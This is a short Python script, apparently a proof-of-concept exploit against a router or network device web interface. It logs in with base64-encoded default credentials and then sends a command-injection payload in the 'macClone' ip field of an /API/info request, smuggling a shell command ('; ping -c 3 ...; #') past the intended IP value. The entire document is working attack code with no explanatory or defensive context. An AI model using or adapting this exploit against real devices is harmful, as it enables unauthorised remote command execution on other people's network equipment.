import requests
import json

url1 = 'http://192.168.10.6/cgi-bin/login.cgi'
data1 = {"username":"YWRtaW4%3D","password":"MTIzNDU2","token":"","source":"web","cn":"","action":"auth"}

response1 = requests.post(url1, data=json.dumps(data1))
print(response1.text)

url = 'http://192.168.10.6/API/info'
headers = {
    'Host': '192.168.10.6',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://192.168.10.6',
    'Referer': 'http://192.168.10.6/idp/idp_ping.html',
    'Cookie': response1.headers['Set-Cookie'].split(" ")[0],
}
data = {
    'macClone': {
        'ip': "127.0.0.1\" ; ping -c 3 192.168.10.128 ; #"
    }
}

response = requests.post(url, headers=headers, data=json.dumps(data))
print(response.text)
